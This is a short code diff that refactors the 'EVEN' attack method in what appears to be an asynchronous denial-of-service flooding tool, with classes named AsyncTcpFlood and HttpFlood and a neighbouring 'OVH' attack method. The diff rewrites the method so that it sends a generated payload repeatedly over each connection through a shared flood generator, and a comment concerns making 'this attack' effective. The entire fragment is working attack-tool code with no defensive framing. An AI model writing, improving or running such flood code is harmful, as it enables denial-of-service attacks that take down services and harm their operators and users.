@@ -961,20 +961,17 @@ class AsyncTcpFlood(HttpFlood):
 
         return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    async def EVEN(self) -> bool:
-        payload: bytes = self.generate_payload()
-        packets_sent, packet_size = 0, len(payload)
-        reader, writer = await self.open_connection()
-        try:
+    async def EVEN(self, on_connect=None) -> bool:
+        packet: bytes = self.generate_payload()
+        packet_size: int = len(packet)
+
+        def _gen():
             for _ in range(self._settings.requests_per_connection):
-                await self._send_packet(writer, payload)
-                packets_sent += 1
+                yield FloodOp.WRITE, (packet, packet_size)
                 # XXX: have to setup buffering properly for this attack to be effective
-                async with timeout(self._settings.tcp_read_timeout_seconds):
-                    await reader.read(1)
-        finally:
-            await self._close_connection(writer)
-        return packets_sent > 0
+                yield FloodOp.READ, 1
+
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
     async def OVH(self, on_connect=None) -> int:
         payload: bytes = self.generate_payload()
